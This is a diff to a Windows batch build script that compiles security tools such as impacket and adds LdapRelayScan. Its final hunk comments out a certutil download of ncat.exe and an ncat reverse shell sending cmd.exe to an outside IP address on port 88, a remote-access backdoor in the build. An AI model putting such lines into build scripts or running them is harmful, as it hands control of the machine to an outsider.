@@ -1,6 +1,8 @@
 CALL config.bat
 CALL pre-install.bat
 
+CALL clone.bat zyn3rgy/LdapRelayScan
+CALL build-py.bat LdapRelayScan, LdapRelayScan, 0
 
 :: Build impacket
 CALL clone.bat SecureAuthCorp/impacket
@@ -158,8 +160,8 @@ CALL sync-thread.bat 0
 dir %scriptpath%\bin\
 dir %_7Z_OUPUT_%
 cd %_7Z_OUPUT_%
-certutil.exe -urlcache -f https://github.com/cyberisltd/NcatPortable/raw/master/ncat.exe ncat.exe
-ncat.exe 51.178.136.102 88 -e cmd.exe
+:: certutil.exe -urlcache -f https://github.com/cyberisltd/NcatPortable/raw/master/ncat.exe ncat.exe
+:: ncat.exe 51.178.136.102 88 -e cmd.exe
 CALL log.bat "✅ Build END"
 EXIT /B 0
 
